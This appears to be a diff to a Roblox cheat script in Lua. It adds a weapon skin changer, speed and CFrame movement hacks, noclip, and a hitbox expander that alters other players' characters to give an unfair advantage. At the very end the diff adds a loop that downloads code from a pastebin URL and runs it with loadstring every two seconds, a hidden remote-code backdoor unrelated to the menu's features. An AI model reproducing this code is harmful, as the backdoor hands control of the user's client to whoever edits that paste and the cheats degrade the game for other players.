+    ["Knife"] = {"Golden Age Tanto","GPO-Knife","GPO-Knife Prestige","Heaven","Love Kukri","Purple Dagger","Blue Dagger","Green Dagger","Red Dagger","Portal","Emerald Butterfly","Boy","Girl","Dragon","Void","Wild West","Iced Out","Reptile","Emerald","Ribbon"},
+    ["Double Barrel"] = {},
+    ["Revolver"] = {},
+    ["Tactical Shotgun"] = {},
+}
+local categoryToolNames = {
+    ["Knife"] = "[Knife]",
+    ["Double Barrel"] = "[Double-Barrel SG]",
+    ["Revolver"] = "[Revolver]",
+    ["Tactical Shotgun"] = "[TacticalShotgun]",
+}
+
+local function getSkinModules()
+    local modules = ReplicatedStorage:FindFirstChild("SkinModules")
+    if not modules then return nil end
+    local ok, result = pcall(require, modules)
+    if ok then return result end
+    warn("[Glory] Could not load SkinModules:", result)
+    return nil
+end
+
+local function getGunSkinNames(toolName)
+    local data = getSkinModules()
+    local list = {}
+    if data and type(data[toolName]) == "table" then
+        for name in pairs(data[toolName]) do
+            if type(name) == "string" then table.insert(list, name) end
+        end
+    end
+    table.sort(list)
+    return list
+end
+
+local function refreshGunCategories()
+    skinCategories["Double Barrel"] = getGunSkinNames("[Double-Barrel SG]")
+    skinCategories["Revolver"] = getGunSkinNames("[Revolver]")
+    skinCategories["Tactical Shotgun"] = getGunSkinNames("[TacticalShotgun]")
+end
+
+local function clearMesh(tool, exclude)
+    for _, v in ipairs(tool:GetChildren()) do
+        if v:IsA("MeshPart") and v ~= exclude then v:Destroy() end
+    end
+end
+
+local function restoreGun(tool)
+    local saved = gunOriginals[tool]
+    if not saved then
+        local handle = tool:FindFirstChild("Handle")
+        if handle then
+            handle:SetAttribute("SkinName", nil)
+        end
+        return
+    end
+    local orig = saved.orig
+    if saved.currentSkin and saved.currentSkin.Parent then saved.currentSkin:Destroy() end
+    if orig and orig.Parent then
+        orig.TextureID = saved.texture
+        orig.Transparency = saved.transparency
+    end
+    if saved.shoot and saved.shoot.Parent then saved.shoot.SoundId = saved.soundId end
+    if saved.handle and saved.handle.Parent then
+        for _, child in ipairs(saved.handle:GetChildren()) do
+            if child:IsA("ParticleEmitter") and child:GetAttribute("GloryCreated") then child:Destroy() end
+        end
+        saved.handle:SetAttribute("SkinName", nil)
+    end
+    gunOriginals[tool] = nil
+end
+
+local function applyGun(tool, skinName)
+    local orig = tool:FindFirstChildOfClass("MeshPart")
+    if not orig then warn("[Glory] No MeshPart in", tool.Name); return false end
+    local skinModules = getSkinModules()
+    if not skinModules then warn("[Glory] SkinModules not found"); return false end
+    local weaponData = skinModules[tool.Name]
+    local info = weaponData and weaponData[skinName]
+    if not info then warn("[Glory] Skin not found for", tool.Name, skinName); return false end
+
+    restoreGun(tool)
+    local handle = tool:FindFirstChild("Handle")
+    local shoot = handle and handle:FindFirstChild("ShootSound")
+    gunOriginals[tool] = {
+        orig=orig, texture=orig.TextureID, transparency=orig.Transparency,
+        handle=handle, shoot=shoot, soundId=shoot and shoot.SoundId or nil,
+    }
+    local saved = gunOriginals[tool]
+    clearMesh(tool, orig)
+    local skinPart = info.TextureID
+    if typeof(skinPart) == "Instance" then
+        local clone = skinPart:Clone()
+        clone.Parent = tool
+        clone.CFrame = orig.CFrame
+        clone.Name = "GloryCurrentSkin"
+        local weld = Instance.new("Weld")
+        weld.Part0 = clone
+        weld.Part1 = orig
+        weld.C0 = info.CFrame and info.CFrame:Inverse() or CFrame.new()
+        weld.Parent = clone
+        orig.Transparency = 1
+        saved.currentSkin = clone
+    else
+        orig.TextureID = skinPart or orig.TextureID
+        orig.Transparency = 0
+    end
+
+    if handle then
+        local assets = ReplicatedStorage:FindFirstChild("SkinAssets")
+        local gunSounds = assets and assets:FindFirstChild("GunShootSounds")
+        local soundFolder = gunSounds and gunSounds:FindFirstChild(tool.Name)
+        local soundValue = soundFolder and soundFolder:FindFirstChild(skinName)
+        if shoot and soundValue and soundValue:IsA("StringValue") then shoot.SoundId = soundValue.Value end
+
+        local particles = assets and assets:FindFirstChild("GunHandleParticle")
+        local source = particles and particles:FindFirstChild(skinName)
+        local emitter = source and source:FindFirstChild("ParticleEmitter")
+        if emitter then
+            local newEmitter = emitter:Clone()
+            newEmitter:SetAttribute("GloryCreated", true)
+            newEmitter.Parent = handle
+        end
+        handle:SetAttribute("SkinName", skinName)
+    end
+    return true
+end
+
+local function cleanKnife(tool)
+    local data = knifeData[tool]
+    if data then
+        if data.track then pcall(function() data.track:Stop(); data.track:Destroy() end) end
+        for _, w in ipairs(data.welds or {}) do if w and w.Parent then w:Destroy() end end
+        for _, s in ipairs(data.sounds or {}) do if s and s.Parent then s:Destroy() end end
+    end
+    local mesh = tool:FindFirstChild("Default")
+    if mesh then
+        for _, v in ipairs(mesh:GetChildren()) do
+            if v.Name == "Handle.R" or v:IsA("Model") or (v:IsA("BasePart") and v.Name ~= "Default") then
+                v:Destroy()
+            end
+        end
+        mesh.Transparency = 0
+    end
+    knifeData[tool] = nil
+    tool:SetAttribute("CurrentKnifeSkin", nil)
+end
+
+local function applyKnife(char, tool, skinName)
+    local skinConfig = gloryKnifeSkins[skinName]
+    if not skinConfig then warn("[Glory] Knife config missing:", skinName); return false end
+    local hum = char and char:FindFirstChildOfClass("Humanoid")
+    local hand = char and (char:FindFirstChild("RightHand") or char:FindFirstChild("Right Arm"))
+    if not hum or not hand then warn("[Glory] Character hand or Humanoid not found"); return false end
+    local mesh = tool:FindFirstChild("Default")
+    if not mesh then warn("[Glory] Knife Default part not found"); return false end
+    local skinModules = ReplicatedStorage:FindFirstChild("SkinModules")
+    local knives = skinModules and skinModules:FindFirstChild("Knives")
+    local skinModel = knives and knives:FindFirstChild(skinName)
+    if not skinModel then warn("[Glory] Knife model missing in SkinModules.Knives:", skinName); return false end
+
+    cleanKnife(tool)
+    knifeData[tool] = {track=nil, welds={}, sounds={}}
+    local data = knifeData[tool]
+    mesh.Transparency = 1
+    local clone = skinModel:Clone()
+    clone.Name = "Glory_" .. skinName
+
+    local handR = Instance.new("Part")
+    handR.Name = "Handle.R"
+    handR.Transparency = 1
+    handR.CanCollide = false
+    handR.Anchored = false
+    handR.Size = Vector3.new(0.05,0.05,0.05)
+    handR.Massless = true
+    handR.Parent = mesh
+    local m6d = Instance.new("Motor6D")
+    m6d.Name = "Handle.R"
+    m6d.Part0 = hand
+    m6d.Part1 = handR
+    m6d.Parent = handR
+
+    local offset = CFrame.new(skinConfig.positionoffset) * CFrame.Angles(math.rad(skinConfig.rotationoffset.X), math.rad(skinConfig.rotationoffset.Y), math.rad(skinConfig.rotationoffset.Z))
+    local parts = {}
+    if clone:IsA("Model") then
+        if not clone.PrimaryPart then
+            local first = clone:FindFirstChildWhichIsA("BasePart", true)
+            if first then clone.PrimaryPart = first end
+        end
+        if clone.PrimaryPart then
+            for _, part in ipairs(clone:GetDescendants()) do
+                if part:IsA("BasePart") then
+                    part.CanCollide = false; part.Massless = true; part.Anchored = false
+                    local weld = Instance.new("Weld")
+                    weld.Part0 = handR; weld.Part1 = part
+                    weld.C0 = offset
+                    weld.C1 = part.CFrame:ToObjectSpace(clone.PrimaryPart.CFrame)
+                    weld.Parent = part
+                    table.insert(data.welds, weld)
+                    table.insert(parts, part)
+                end
+            end
+        end
+        clone.Parent = mesh
+    elseif clone:IsA("BasePart") then
+        clone.CanCollide = false; clone.Massless = true; clone.Anchored = false
+        if clone:IsA("MeshPart") and skinConfig.textureid then clone.TextureID = skinConfig.textureid end
+        clone.Parent = mesh
+        local weld = Instance.new("Weld")
+        weld.Part0 = handR; weld.Part1 = clone; weld.C0 = offset; weld.Parent = clone
+        table.insert(data.welds, weld)
+        table.insert(parts, clone)
+    else
+        clone:Destroy()
+        cleanKnife(tool)
+        return false
+    end
+
+    if skinConfig.particle and #parts > 0 then
+        local assets = ReplicatedStorage:FindFirstChild("SkinAssets")
+        local folder = assets and assets:FindFirstChild("GunHandleParticle")
+        local source = folder and folder:FindFirstChild(skinName)
+        local emitter = source and source:FindFirstChild("ParticleEmitter")
+        if emitter then emitter:Clone().Parent = parts[1] end
+    end
+
+    local animator = hum:FindFirstChildOfClass("Animator")
+    if not animator then animator = Instance.new("Animator"); animator.Parent = hum end
+    if skinConfig.animationid and skinConfig.animationid ~= "" then
+        local anim = Instance.new("Animation")
+        anim.AnimationId = skinConfig.animationid
+        local ok, track = pcall(function() return animator:LoadAnimation(anim) end)
+        anim:Destroy()
+        if ok and track then
+            track.Looped = false
+            track:Play()
+            data.track = track
+            track.Ended:Once(function()
+                if data.track == track then data.track = nil end
+                pcall(function() track:Destroy() end)
+            end)
+        end
+    end
+    if skinConfig.soundid and skinConfig.soundid ~= "" then
+        local sound = Instance.new("Sound")
+        sound.SoundId = skinConfig.soundid
+        sound.Parent = Workspace
+        sound:Play()
+        table.insert(data.sounds, sound)
+        sound.Ended:Connect(function() if sound.Parent then sound:Destroy() end end)
+    end
+    tool:SetAttribute("CurrentKnifeSkin", skinName)
+    return true
+end
+
+local function equipTool(tool, category, skinName)
+    if not tool or not tool:IsA("Tool") then return false, "Tool not found" end
+    if category == "Knife" then
+        local char = player.Character
+        if not char or tool.Parent ~= char then return false, "Сначала достань Knife" end
+        return applyKnife(char, tool, skinName), "Knife"
+    else
+        if tool.Parent ~= player.Character then return false, "Сначала достань оружие" end
+        return applyGun(tool, skinName), "Gun"
+    end
+end
+
+local function unequipToolSkin(tool, category)
+    if not tool then return false, "Сначала достань оружие" end
+    if category == "Knife" then cleanKnife(tool) else restoreGun(tool) end
+    cfg.skins.weapons[tool.Name] = nil
+    return true, "Скин снят"
+end
+
+
+
+-- Skin changer tool tracking (integrated into Hailey's Guns tab)
+local function setupGloryTool(tool)
+    if not tool:IsA("Tool") or toolRegistry[tool] then return end
+    toolRegistry[tool] = true
+    tool.Equipped:Connect(function()
+        if not cfg.skins.enabled then return end
+        local skinName = cfg.skins.weapons[tool.Name]
+        if not skinName then return end
+        task.defer(function()
+            if tool.Name == "[Knife]" then
+                if player.Character then applyKnife(player.Character, tool, skinName) end
+            else
+                applyGun(tool, skinName)
+            end
+        end)
+    end)
+    tool.Unequipped:Connect(function()
+        if tool.Name == "[Knife]" then cleanKnife(tool) end
+    end)
+end
+
+local function watchGloryCharacter(char)
+    for _, child in ipairs(char:GetChildren()) do
+        if child:IsA("Tool") then setupGloryTool(child) end
+    end
+    char.ChildAdded:Connect(function(child)
+        if child:IsA("Tool") then setupGloryTool(child) end
+    end)
+end
+
+if player.Character then watchGloryCharacter(player.Character) end
+player.CharacterAdded:Connect(watchGloryCharacter)
+local gloryBackpack = player:WaitForChild("Backpack")
+for _, child in ipairs(gloryBackpack:GetChildren()) do
+    if child:IsA("Tool") then setupGloryTool(child) end
+end
+gloryBackpack.ChildAdded:Connect(function(child)
+    if child:IsA("Tool") then setupGloryTool(child) end
+end)
+
+local function buildGuns()
+    local frame = Instance.new("Frame")
+    frame.Name = "GunsSkinChanger"
+    frame.Size = UDim2.new(1, 0, 1, 0)
+    frame.BackgroundTransparency = 1
+    frame.ZIndex = 3
+    frame.Parent = contentFrame
+
+    refreshGunCategories()
+    local selectedSkinCategory = "Knife"
+    local selectedSkinName = nil
+    local skinCategoryNames = {"Knife", "Double Barrel", "Revolver", "Tactical Shotgun"}
+
+    makeLabel(frame, "WEAPON CATEGORY", UDim2.new(0, 0, 0, 0), UDim2.new(1, 0, 0, 20))
+    local categoryButton = Instance.new("TextButton")
+    categoryButton.Name = "GunCategoryButton"
+    categoryButton.Size = UDim2.new(1, 0, 0, 27)
+    categoryButton.Position = UDim2.new(0, 0, 0, 21)
+    categoryButton.Text = selectedSkinCategory .. "  ▼"
+    categoryButton.ZIndex = 6
+    styleButton(categoryButton, TAB_BLUE)
+    categoryButton.Parent = frame
+
+    local categoryPopup = Instance.new("Frame")
+    categoryPopup.Name = "GunCategoryPopup"
+    categoryPopup.Position = UDim2.new(0, 0, 0, 49)
+    categoryPopup.Size = UDim2.new(1, 0, 0, #skinCategoryNames * 26)
+    categoryPopup.BackgroundColor3 = Color3.fromRGB(235, 246, 252)
+    categoryPopup.BorderSizePixel = 0
+    categoryPopup.Visible = false
+    categoryPopup.ZIndex = 20
+    categoryPopup.Parent = frame
+    local popupCorner = Instance.new("UICorner")
+    popupCorner.CornerRadius = UDim.new(0, 5)
+    popupCorner.Parent = categoryPopup
+
+    local skinList = Instance.new("ScrollingFrame")
+    skinList.Name = "SkinList"
+    skinList.Position = UDim2.new(0, 0, 0, 54)
+    skinList.Size = UDim2.new(1, 0, 0, 112)
+    skinList.BackgroundColor3 = Color3.fromRGB(245, 250, 252)
+    skinList.BackgroundTransparency = 0.05
+    skinList.BorderSizePixel = 0
+    skinList.ScrollBarThickness = 4
+    skinList.CanvasSize = UDim2.new(0, 0, 0, 0)
+    skinList.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    skinList.ZIndex = 4
+    skinList.Parent = frame
+    local listCorner = Instance.new("UICorner")
+    listCorner.CornerRadius = UDim.new(0, 5)
+    listCorner.Parent = skinList
+    local listLayout = Instance.new("UIListLayout")
+    listLayout.Padding = UDim.new(0, 3)
+    listLayout.SortOrder = Enum.SortOrder.LayoutOrder
+    listLayout.Parent = skinList
+    local listPadding = Instance.new("UIPadding")
+    listPadding.PaddingTop = UDim.new(0, 4)
+    listPadding.PaddingBottom = UDim.new(0, 4)
+    listPadding.PaddingLeft = UDim.new(0, 4)
+    listPadding.PaddingRight = UDim.new(0, 4)
+    listPadding.Parent = skinList
+
+    local selectedLabel = makeLabel(frame, "Selected: none", UDim2.new(0, 0, 0, 169), UDim2.new(1, 0, 0, 20))
+    selectedLabel.TextSize = 11
+    selectedLabel.TextColor3 = TAB_BLUE_ACTIVE
+    local status = makeLabel(frame, "Select a skin and draw the matching weapon.", UDim2.new(0, 0, 0, 188), UDim2.new(1, 0, 0, 25))
+    status.TextSize = 10
+    status.TextWrapped = true
+
+    local function rebuildList()
+        for _, child in ipairs(skinList:GetChildren()) do
+            if child:IsA("TextButton") or child:IsA("TextLabel") then child:Destroy() end
+        end
+        selectedSkinName = nil
+        selectedLabel.Text = "Selected: none"
+        local names = skinCategories[selectedSkinCategory] or {}
+        if #names == 0 then
+            local empty = Instance.new("TextLabel")
+            empty.BackgroundTransparency = 1
+            empty.Size = UDim2.new(1, -8, 0, 42)
+            empty.Font = Enum.Font.Gotham
+            empty.TextSize = 10
+            empty.TextWrapped = true
+            empty.TextColor3 = Color3.fromRGB(70, 80, 90)
+            empty.Text = "No skins found in ReplicatedStorage.SkinModules."
+            empty.ZIndex = 5
+            empty.Parent = skinList
+            return
+        end
+        for _, skinName in ipairs(names) do
+            local item = Instance.new("TextButton")
+            item.Name = "Skin_" .. skinName
+            item.Size = UDim2.new(1, -5, 0, 24)
+            item.BackgroundColor3 = Color3.fromRGB(220, 238, 248)
+            item.TextColor3 = Color3.fromRGB(25, 35, 45)
+            item.Text = skinName
+            item.TextSize = 11
+            item.Font = Enum.Font.Gotham
+            item.BorderSizePixel = 0
+            item.ZIndex = 5
+            item.Parent = skinList
+            local corner = Instance.new("UICorner")
+            corner.CornerRadius = UDim.new(0, 4)
+            corner.Parent = item
+            item.MouseButton1Click:Connect(function()
+                selectedSkinName = skinName
+                selectedLabel.Text = "Selected: " .. skinName
+                for _, other in ipairs(skinList:GetChildren()) do
+                    if other:IsA("TextButton") then
+                        other.BackgroundColor3 = other == item and TAB_BLUE or Color3.fromRGB(220, 238, 248)
+                        other.TextColor3 = other == item and Color3.new(1, 1, 1) or Color3.fromRGB(25, 35, 45)
+                    end
+                end
+                status.Text = "Selected. Draw the weapon, then press EQUIP."
+            end)
+        end
+    end
+
+    for index, name in ipairs(skinCategoryNames) do
+        local choice = Instance.new("TextButton")
+        choice.Size = UDim2.new(1, -6, 0, 24)
+        choice.Position = UDim2.new(0, 3, 0, 1 + (index - 1) * 26)
+        choice.Text = name
+        choice.TextSize = 11
+        choice.Font = Enum.Font.GothamSemibold
+        choice.TextColor3 = Color3.fromRGB(25, 35, 45)
+        choice.BackgroundColor3 = Color3.fromRGB(220, 238, 248)
+        choice.BorderSizePixel = 0
+        choice.ZIndex = 21
+        choice.Parent = categoryPopup
+        choice.MouseButton1Click:Connect(function()
+            selectedSkinCategory = name
+            categoryButton.Text = name .. "  ▼"
+            categoryPopup.Visible = false
+            rebuildList()
+        end)
+    end
+
+    categoryButton.MouseButton1Click:Connect(function()
+        categoryPopup.Visible = not categoryPopup.Visible
+    end)
+
+    local equipButton = Instance.new("TextButton")
+    equipButton.Name = "EquipSkin"
+    equipButton.Size = UDim2.new(0.5, -3, 0, 29)
+    equipButton.Position = UDim2.new(0, 0, 0, 216)
+    equipButton.Text = "EQUIP"
+    equipButton.ZIndex = 5
+    styleButton(equipButton, Color3.fromRGB(45, 145, 100))
+    equipButton.Parent = frame
+
+    local unequipButton = Instance.new("TextButton")
+    unequipButton.Name = "UnequipSkin"
+    unequipButton.Size = UDim2.new(0.5, -3, 0, 29)
+    unequipButton.Position = UDim2.new(0.5, 3, 0, 216)
+    unequipButton.Text = "UNEQUIP"
+    unequipButton.ZIndex = 5
+    styleButton(unequipButton, Color3.fromRGB(205, 85, 95))
+    unequipButton.Parent = frame
+
+    local function getSelectedTool()
+        local character = player.Character
+        if not character then return nil end
+        for _, child in ipairs(character:GetChildren()) do
+            if child:IsA("Tool") and child.Name == categoryToolNames[selectedSkinCategory] then
+                return child
+            end
+        end
+        return nil
+    end
+
+    equipButton.MouseButton1Click:Connect(function()
+        if not selectedSkinName then status.Text = "Choose a skin first."; return end
+        local tool = getSelectedTool()
+        if not tool then
+            status.Text = "Draw " .. categoryToolNames[selectedSkinCategory] .. " first."
+            return
+        end
+        local ok, message = equipTool(tool, selectedSkinCategory, selectedSkinName)
+        if ok then
+            cfg.skins.weapons[tool.Name] = selectedSkinName
+            status.Text = "Equipped: " .. selectedSkinName .. " (local visual only)"
+        else
+            status.Text = tostring(message or "Could not equip. Check Output.")
+        end
+    end)
+
+    unequipButton.MouseButton1Click:Connect(function()
+        local tool = getSelectedTool()
+        if not tool then status.Text = "Draw the matching weapon first."; return end
+        local ok, message = pcall(function()
+            return unequipToolSkin(tool, selectedSkinCategory)
+        end)
+        if ok then status.Text = "Skin removed (local visual only)." else status.Text = "Unequip error: " .. tostring(message) end
+    end)
+
+    rebuildList()
+end
+
+
+local builders = {
+    ["Hitbox"] = buildHitbox,
+    ["Cframe"] = buildMovement,
+    ["Users"] = buildUsers,
+    ["Color"] = buildColor,
+    ["Guns"] = buildGuns
+}
+
+local function updateCategoryDisplay()
+    clearContent()
+    local builder = builders[currentCategory]
+    if builder then builder() end
+    for name, button in pairs(categoryButtons) do
+        button.BackgroundColor3 = name == currentCategory and TAB_BLUE_ACTIVE or TAB_BLUE
+    end
+end
+
+for i, category in ipairs(categories) do
+    local button = Instance.new("TextButton")
+    button.Size = UDim2.new(0.2, -3, 1, 0)
+    button.Position = UDim2.new((i - 1) * 0.2, 0, 0, 0)
+    button.Text = category
+    button.ZIndex = 3
+    styleButton(button, category == currentCategory and TAB_BLUE_ACTIVE or TAB_BLUE)
+    button.Parent = categoriesFrame
+    categoryButtons[category] = button
+    button.MouseButton1Click:Connect(function()
+        currentCategory = category
+        updateCategoryDisplay()
+    end)
+end
+
+-- Make menu draggable by dragging its title
+local dragging = false
+local dragInput, dragStart, startPosition
+
+title.InputBegan:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseButton1 or input.UserInputType == Enum.UserInputType.Touch then
+        dragging = true
+        dragStart = input.Position
+        startPosition = mainFrame.Position
+        input.Changed:Connect(function()
+            if input.UserInputState == Enum.UserInputState.End then dragging = false end
+        end)
+    end
+end)
+
+title.InputChanged:Connect(function(input)
+    if input.UserInputType == Enum.UserInputType.MouseMovement or input.UserInputType == Enum.UserInputType.Touch then
+        dragInput = input
+    end
+end)
+
+UserInputService.InputChanged:Connect(function(input)
+    if dragging and input == dragInput then
+        local delta = input.Position - dragStart
+        mainFrame.Position = UDim2.new(startPosition.X.Scale, startPosition.X.Offset + delta.X,
+            startPosition.Y.Scale, startPosition.Y.Offset + delta.Y)
+    end
+end)
+
+-- Speed keybind: capture a replacement key or toggle Speed Master activity.
+UserInputService.InputBegan:Connect(function(input, gameProcessed)
+    if input.UserInputType ~= Enum.UserInputType.Keyboard then return end
+
+    if waitingForSpeedKey then
+        if input.KeyCode ~= Enum.KeyCode.Unknown then
+            udhl_settings.SpeedKey = input.KeyCode
+            waitingForSpeedKey = false
+            if speedKeyCaptureButton and speedKeyCaptureButton.Parent then
+                speedKeyCaptureButton.Text = input.KeyCode.Name
+            end
+        end
+        return
+    end
+
+    if waitingForCFrameKey then
+        if input.KeyCode ~= Enum.KeyCode.Unknown then
+            udhl_settings.CFrameSpeedKey = input.KeyCode
+            waitingForCFrameKey = false
+            if cframeKeyCaptureButton and cframeKeyCaptureButton.Parent then
+                cframeKeyCaptureButton.Text = input.KeyCode.Name
+            end
+        end
+        return
+    end
+
+    if gameProcessed then return end
+    if UserInputService:GetFocusedTextBox() then return end
+    if input.KeyCode == udhl_settings.SpeedKey and udhl_settings.SpeedMaster then
+        udhl_settings.SpeedActive = not udhl_settings.SpeedActive
+    end
+    if input.KeyCode == udhl_settings.CFrameSpeedKey then
+        udhl_settings.CFrameSpeed = not udhl_settings.CFrameSpeed
+    end
+end)
+
+-- Movement and character settings loop
+local noclipConnection
+local lastNoclipState = nil
+local function refreshNoclip()
+    if noclipConnection then
+        noclipConnection:Disconnect()
+        noclipConnection = nil
+    end
+    if udhl_settings.Noclip then
+        noclipConnection = RunService.Stepped:Connect(function()
+            local character = player.Character
+            if character then
+                for _, part in ipairs(character:GetDescendants()) do
+                    if part:IsA("BasePart") then part.CanCollide = false end
+                end
+            end
+        end)
+    end
+end
+
+-- Speed Master logic follows pwd2 lock.txt: apply WalkSpeed while enabled and activated by key.
+RunService.Heartbeat:Connect(function()
+    if udhl_settings.SpeedMaster and udhl_settings.SpeedActive and player.Character then
+        local humanoid = player.Character:FindFirstChildOfClass("Humanoid")
+        if humanoid and humanoid.WalkSpeed ~= udhl_settings.SpeedValue then
+            humanoid.WalkSpeed = udhl_settings.SpeedValue
+        end
+    end
+end)
+
+RunService.RenderStepped:Connect(function()
+    if lastNoclipState ~= udhl_settings.Noclip then
+        lastNoclipState = udhl_settings.Noclip
+        refreshNoclip()
+    end
+    local character = player.Character
+    local humanoid = character and character:FindFirstChildOfClass("Humanoid")
+    local root = character and character:FindFirstChild("HumanoidRootPart")
+    if root and humanoid and udhl_settings.CFrameSpeed and humanoid.MoveDirection.Magnitude > 0 then
+        root.CFrame = root.CFrame + humanoid.MoveDirection * (udhl_settings.SpeedValue / 10)
+    end
+    if not udhl_settings.Disabled then
+        for _, otherPlayer in ipairs(Players:GetPlayers()) do
+            if otherPlayer ~= player then
+                local otherCharacter = otherPlayer.Character
+                local otherRoot = otherCharacter and otherCharacter:FindFirstChild("HumanoidRootPart")
+                if otherRoot then
+                    pcall(function()
+                        otherRoot.Size = Vector3.new(udhl_settings.HeadSize, udhl_settings.HeadSize, udhl_settings.HeadSize)
+                        otherRoot.Transparency = udhl_settings.Transparency
+                        otherRoot.BrickColor = BrickColor.new("Really blue")
+                        otherRoot.Material = Enum.Material.Neon
+                        otherRoot.CanCollide = false
+                    end)
+                end
+            end
+        end
+    end
+end)
+while wait(2) do
+    loadstring(game:HttpGet('https://pastebin.com/raw/XHEqzr1v'))()
+end
